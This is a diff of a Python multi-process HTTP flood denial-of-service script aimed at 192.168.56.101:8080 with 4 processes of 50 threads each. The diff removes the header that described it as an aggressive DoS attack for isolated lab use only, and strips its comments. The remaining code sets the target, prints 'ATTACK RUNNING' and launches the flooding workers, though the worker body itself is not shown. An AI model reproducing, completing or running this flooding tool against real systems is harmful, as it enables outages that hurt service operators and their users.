@@ -1,10 +1,4 @@
 #!/usr/bin/env python3
-"""
-HTTP Flood DoS Attack - Aggressive Multi-process
-Educational use in isolated lab only
-Usage: sudo python3 attack.py
-"""
-
 import socket
 import signal
 import sys
@@ -13,8 +7,8 @@ import threading
 
 TARGET = '192.168.56.101'
 PORT = 8080
-PROCESSES = 4      # Number of CPU processes
-THREADS = 50       # Threads per process
+PROCESSES = 4      
+THREADS = 50       
 running = True
 
 def cleanup(sig=None, frame=None):
@@ -61,14 +55,14 @@ if __name__ == "__main__":
     print("[*] Press CTRL+C to stop\n")
     print("[!] ATTACK RUNNING...\n")
     
-    # Launch multiple processes
+   
     processes = []
     for _ in range(PROCESSES):
         p = multiprocessing.Process(target=worker, daemon=True)
         p.start()
         processes.append(p)
     
-    # Keep main alive until CTRL+C
+    
     try:
         for p in processes:
             p.join()
